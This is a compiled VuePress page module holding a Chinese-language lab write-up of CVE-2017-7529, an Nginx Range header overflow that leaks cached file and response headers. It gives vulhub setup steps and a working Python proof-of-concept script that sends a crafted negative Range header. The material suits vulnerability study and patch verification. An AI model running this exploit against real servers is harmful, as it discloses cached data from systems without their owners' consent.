import{_ as a,p as t,q as p,s as n,R as s,Z as e}from"./framework-47a2e622.js";const o="/images/image-20220307133726141.22e18a4a.png",c="/images/微信图片_20220815151052.png",l={},u=n("h2",{id:"漏洞简介",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞简介","aria-hidden":"true"},"#"),s(" 漏洞简介")],-1),i=n("p",null,"Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。",-1),r=n("div",{class:"custom-container info"},[n("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[n("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[n("circle",{cx:"12",cy:"12",r:"9"}),n("path",{d:"M12 8h.01"}),n("path",{d:"M11 12h1v4h1"})])]),n("p",{class:"custom-container-title"},"影响版本"),n("ul",{class:"contains-task-list"},[n("li",{class:"task-list-item"},[n("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),s(" Nginx 0.5.6 ~ 1.13.2")])])],-1),k=e(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><ul><li>环境搭建</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git
<span class="token builtin class-name">cd</span> vulhub/nginx/CVE-2017-7529
<span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span>
</code></pre></div><p>访问 http://xxx.xxx.xxx.xxx:8080 正常即可。</p><p><img src="`+o+`" alt=""></p><ul><li>POC</li></ul><div class="language-python" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;%s url&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;eg: python %s http://your-ip:8080/&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;</span>
<span class="token punctuation">}</span>
offset <span class="token operator">=</span> <span class="token number">605</span>
url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
file_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>
n <span class="token operator">=</span> file_len <span class="token operator">+</span> offset
headers<span class="token punctuation">[</span><span class="token string">&#39;Range&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;bytes=-%d,-%d&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>
    n<span class="token punctuation">,</span> <span class="token number">0x8000000000000000</span> <span class="token operator">-</span> n<span class="token punctuation">)</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
</code></pre></div><p>使用 POC 进行验证：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>python poc.py http://xxx.xxx.xxx.xxx:8080/
</code></pre></div><p><img src="`+c+'" alt=""></p>',10),d=[u,i,r,k];function h(g,x){return t(),p("div",null,d)}const _=a(l,[["render",h],["__file","3.html.vue"]]);export{_ as default};
